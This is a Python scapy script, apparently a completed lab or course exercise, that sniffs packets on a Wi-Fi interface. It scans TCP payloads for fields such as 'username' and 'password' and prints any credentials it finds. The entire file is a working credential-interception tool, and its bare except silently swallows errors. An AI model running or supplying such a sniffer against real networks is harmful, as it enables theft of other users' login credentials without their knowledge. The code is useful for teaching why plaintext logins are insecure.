from scapy.all import *
from urllib import parse
import re

iface = "Wi-Fi" # your computer's sniffing interface name

"""Given a packet, this function uses key words and phrases to search for the username and password stored within a TCP packet."""
def get_login_pass(body):
    user = None
    passwd = None
    
    userfields = ['login', 'user', 'uname', 'username', 'nickname', 'userid', 'login_id', 'sessionkey', 'session_key', 'uname']
    
    passfields = ['password', 'passphrase', 'pass', 'passwd']
    
    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    
    ## Repeat the same block of code above for the password field
    ## -------------
    for password in passfields:
        password_re = re.search('(%s=[^&]+)' % password, body, re.IGNORECASE)
        if password_re:
            passwd = password_re.group()
    ## -------------
    
    if user and passwd:
        # return both
        ## -------------
        return (user, passwd)
        ## -------------

"""Given an individual packet, this function checks if it has a TCP, IP, and Raw layer, then calls the get_login_pass function and prints the users username and password."""
def pkt_parser(packet):
    try:
        ## if packet.haslayer is TCP and Raw and IP
            ## store TCP payload in a variable
            ## call the get_login_pass function and pass the variable, 
            ## store the return value in a variable as a list
            ## check if the return value is not empty and
                ## print TCP payload
                ## print(parse.unquote(variable[0])) for username
                ## print(parse.unquote(variable[1])) for password
        ## else:
            ## pass
        ## --------------
        if packet.haslayer(TCP) and packet.haslayer(IP) and packet.haslayer(Raw):
            body = str(packet[TCP].payload)
            user_pass = list(get_login_pass(body))
            if user_pass:
                print(body)
                print(parse.unquote(user_pass[0]))
                print(parse.unquote(user_pass[1]))
            else:
                pass
    except:
        pass
    ## ---------------

"""Calls the sniffer function on our given interface, calling the pkt_parser function on each packet."""
def main():
    try:
        sniff(iface=iface, prn=pkt_parser, store=0)

    except KeyboardInterrupt:
        print('Exiting..')
        exit()

if __name__ == "__main__":
    main()